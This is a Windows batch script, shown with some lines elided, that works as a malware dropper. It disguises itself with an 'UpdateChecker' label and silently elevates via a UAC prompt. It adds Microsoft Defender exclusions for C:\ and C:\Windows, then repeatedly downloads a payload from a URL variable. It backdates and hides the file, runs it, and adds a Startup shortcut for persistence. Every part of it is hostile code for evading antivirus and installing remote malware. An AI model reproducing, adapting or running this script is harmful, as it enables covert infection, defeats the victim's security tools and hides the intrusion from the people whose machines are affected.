@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start /min "" cmd /c "%~f0" %* && exit
...
fsutil dirty query %systemdrive% 1>nul 2>nul || (
    echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/c set IS_MINIMIZED=1 && start /min cmd /c ""%~f0""", "", "runas", 0 >> "%temp%\getadmin.vbs"
...
set "UpdateChecker=powershell -ExecutionPolicy Bypass -WindowStyle Hidden"

%UpdateChecker% -c "if(Get-Command Add-MpPreference -ErrorAction SilentlyContinue){Add-MpPreference -ExclusionPath 'C:\', 'C:\Windows', 'C:\Program Files (x86)\Microsoft\EdgeUpdate'}" >nul 2>&1
...
:downLoop
if not exist "%DEST%" (
    %UpdateChecker% -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%URL%', '%DEST%')" >nul 2>&1
    timeout /t 5 /nobreak >nul
    goto downLoop
)

%UpdateChecker% -c "if(Test-Path '%DEST%'){$(Get-Item '%DEST%').CreationTime='11/12/2022 10:15:00'; $(Get-Item '%DEST%').LastWriteTime='11/12/2022 10:15:00'}" >nul 2>&1
attrib +s +h "%DEST%" >nul 2>&1
start /min "" "%DEST%"
...
%UpdateChecker% -c "$ws=New-Object -ComObject WScript.Shell; $s=$ws.CreateShortcut('%STARTUP_LNK%'); $s.TargetPath='%DEST%'; $s.WindowStyle=7; $s.Save()" >nul 2>&1
